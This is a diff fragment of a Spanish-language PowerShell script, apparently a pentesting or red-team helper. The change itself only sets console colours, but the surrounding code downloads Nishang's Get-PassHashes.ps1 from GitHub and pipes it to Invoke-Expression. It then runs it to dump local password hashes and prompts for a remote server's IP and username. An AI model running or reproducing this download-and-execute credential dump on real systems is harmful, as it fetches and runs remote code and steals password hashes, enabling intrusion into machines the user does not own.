@@ -68,9 +68,11 @@ function ConvertFrom-SecureToPlain {
         if($hash -like 's*') { 
         Write-Host "Recuperando hashes locales.." -ForegroundColor Magenta
         Write-Host ""
+	$Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1" -UseBasicParsing | iex
         Get-PassHashes 2> $null
-        Write-Host ""}
+        $Host.UI.RawUI.ForegroundColor = 'Gray'
+	Write-Host ""}
         $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
         Write-Host ""
         $user = Read-Host -Prompt 'Y el usuario?'
